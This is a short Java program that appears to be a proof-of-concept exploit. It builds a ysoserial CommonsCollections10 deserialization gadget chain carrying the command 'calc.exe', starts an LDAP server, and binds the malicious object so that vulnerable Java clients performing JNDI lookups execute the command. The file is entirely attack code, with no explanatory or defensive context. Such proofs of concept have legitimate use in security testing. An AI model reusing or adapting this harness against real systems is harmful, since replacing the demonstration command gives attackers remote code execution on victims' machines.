import runnable.BindEXP;
import runnable.RunLDAPServer;
import ysoserial.payloads.CommonsCollections10;

public class Main {
    public static void main(String[] args) throws Exception {
        Object o = new CommonsCollections10().getObject("calc.exe");
        RunLDAPServer.runLDAPServer();
        BindEXP.bindEXP(o);
    }
}
